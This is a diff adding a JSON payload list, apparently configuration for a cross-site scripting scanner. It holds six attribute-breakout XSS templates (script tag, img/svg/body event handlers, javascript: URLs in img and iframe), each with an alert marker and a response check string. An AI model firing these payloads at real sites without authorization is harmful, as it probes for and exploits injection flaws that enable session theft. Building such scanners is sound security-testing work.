@@ -1,0 +1,10 @@
+{
+  "payloads": [
+    {"id": "script-tag", "name": "script 标签注入", "template": "\"><script>alert('{marker}')</script>", "check": "<script>"},
+    {"id": "img-onerror", "name": "img onerror 事件", "template": "\"><img src=x onerror=alert('{marker}')>", "check": "<img"},
+    {"id": "svg-onload", "name": "svg onload 事件", "template": "\"><svg onload=alert('{marker}')>", "check": "<svg"},
+    {"id": "img-javascript", "name": "img javascript 伪协议", "template": "\"><img src=javascript:alert('{marker}')>", "check": "<img"},
+    {"id": "body-onload", "name": "body onload 事件", "template": "\"><body onload=alert('{marker}')>", "check": "<body"},
+    {"id": "iframe-javascript", "name": "iframe javascript 伪协议", "template": "\"><iframe src=javascript:alert('{marker}')>", "check": "<iframe"}
+  ]
+}
